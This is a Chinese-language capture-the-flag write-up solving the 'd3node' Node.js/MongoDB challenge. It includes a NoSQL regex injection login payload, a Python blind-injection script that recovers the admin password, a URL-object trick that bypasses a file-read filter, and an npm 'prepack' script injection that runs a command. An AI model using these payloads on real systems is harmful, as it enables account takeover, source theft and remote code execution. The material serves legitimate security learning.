# d3node

## 题目简述

题目是 Node.js/MongoDB 应用链。登录口存在 NoSQL 注入和 WAF，需要先盲注管理员密码拿到管理员权限；文件预览接口有任意文件读取，但会过滤 `app` 字符串，需要利用 `fs.readFileSync` 对 URL-like 对象的处理差异绕过；拿到源码后发现 `/PackDependencies` 会执行 `npm pack`，可通过 `/SetDependencies` 写入 `scripts.prepack` 实现命令执行。

## 解题过程

登录页按 F12 可以看到 hint1。

测试后发现登录处存在 NoSQL 注入和 WAF，需要自行构造绕过方式。

```
{"username": {"$regex": "admin"}, "password": {"$regex": "" }}
```

登录后可以看到 hint2，它提示存在任意文件读取漏洞。

```
/dashboardIndex/ShowExampleFile?filename=/proc/self/cmdline
```

读取文件时，如果 `filename` 参数值中包含 `app`，会返回 `hacker`。

需要利用 `readFileSync` 的特性绕过。关键原理是 Node 的文件 API 不只接受普通字符串，也可以接受 path-like object 和 URL object。通过传入 `protocol`、`hostname`、`origin`、`pathname` 等字段，后端校验看到的是结构化对象，而 `readFileSync` 最终会把它解析成 `file:` 路径。这样就避免了直接在参数值中出现被拦截的字面量子串。

可能需要二次 URL 编码，因为浏览器会先自动解码一次。

读取 `app.js` 文件：

```
/dashboardIndex/ShowExampleFile?
filename[href]=aa&filename[origin]=aa&filename[protocol]=file:&filename[hostname
]=&filename
[pathname]=/proc/self/cwd/%2561%2570%2570%252e%256a%2573
```

读取 `app.js` 和其他源码后可以发现，`/PackDependencies` 会执行 `npm pack`。根据 npm 官方文档，可以在 `scripts` 字段中设置 `prepack` 命令，它会在 `npm pack` 前执行，因此可以借此完成任意命令执行。

Node/npm 文档中的生命周期脚本顺序说明：`prepare` 会在打包和安装依赖的部分场景中执行，因此恶意包可借此触发命令。

可以在 `/SetDependencies` 路由设置 dependencies，并利用 `Object.assign` 的覆盖特性写入字段。

```
{
"name": "d3ctf2023",
"version": "1.0.0",
"dependencies": { ...
},
"scripts": {
"prepack": "/readflag >> /tmp/success.txt"
}
}
```

上述操作需要管理员权限。后端检查逻辑是：必须提供 admin 用户名和 admin 对应密码，才会在当前 session 中写入管理员权限。

因此需要通过 NoSQL 盲注得到 admin 密码。

```
import requests
remoteHost = "localhost:8080"
burp0_url = f"http://{remoteHost}/user/LoginIndex"
dict_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_0123456789"
password = ""
for i in range(50):
    for i in dict_list:
        burp0_json={"password": {"$regex": f"^{password + i}.*"}, "username":
            {"$regex": "admin"}}
        res = requests.post(burp0_url, json=burp0_json,
        allow_redirects=False)
        if res.status_code == 302:
            password += i
            print(password)
            break
```

admin/dob2xdriaqpytdyh6jo3

最后通过 `/ShowExampleFile` 路由读取上面的 `success.txt`。

## 方法总结

- 核心技巧：Mongo NoSQL 正则盲注、URL-like object 绕过文件名过滤、任意文件读取源码、`npm pack` 的 `prepack` 生命周期命令执行。
- 识别信号：Node 后台把用户 JSON 直接传给 Mongo 查询、又把对象参数传给文件 API 时，要同时检查 NoSQL 注入和 path-like object 解析差异。
- 复用要点：`npm pack` 前会执行 package.json 中的 `scripts.prepack`，只要能控制依赖配置或包元数据，就可能把打包功能变成命令执行点。
